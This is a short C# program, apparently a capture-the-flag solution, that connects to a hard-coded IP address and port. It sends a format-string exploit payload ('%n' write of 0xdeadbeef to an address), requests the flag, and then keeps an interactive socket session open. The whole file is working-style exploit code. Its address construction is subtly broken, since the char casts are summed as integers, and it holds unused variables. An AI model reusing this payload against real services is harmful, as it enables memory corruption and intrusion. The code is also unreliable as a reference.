using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading; 
namespace Scripts
{
    class ConnectAndExploit
    {
        public void work()
        {
            var s = new TcpClient(); 

            s.Connect("164.132.103.207" , 5001) ;
            var stream = s.GetStream();

            byte[] b = new byte[255];
            char [] c = new char[255] ;
            stream.Read(b, 0, 255);
            for (int i = 0; i < 255; i++)
            {
                c[i] = (char)b[i]; 
            }
            Console.WriteLine(c);
            String str = new String(c);
            string ad = "\xc0\x14\x60";
            String a = (char)0xc0+(char)0x14+(char)0x60+"%3735928554x%8$n"; 

            stream.Write(System.Text.Encoding.ASCII.GetBytes(a),0,a.Length);
            stream.Write(System.Text.Encoding.ASCII.GetBytes("flag"), 0, 4);
            Thread.Sleep(100);
            stream.Read(b, 0, 255);

            for (int i = 0; i < 255; i++)
            {
                c[i] = (char)b[i];
            }
            str = new String(c);
          
            Console.WriteLine(str);
            String ch =  Console.ReadLine();
            while (!ch.Equals("q")) {
                stream.Write(System.Text.Encoding.ASCII.GetBytes(ch), 0, ch.Length);
                Thread.Sleep(10);
                stream.Read(b, 0, 255); 
                for (int i = 0; i < 255; i++)
                {
                    c[i] = (char)b[i];
                }
                str = new String(c);
                Console.WriteLine(str);
                ch = Console.ReadLine();
                
            }
            

        }

    }
}
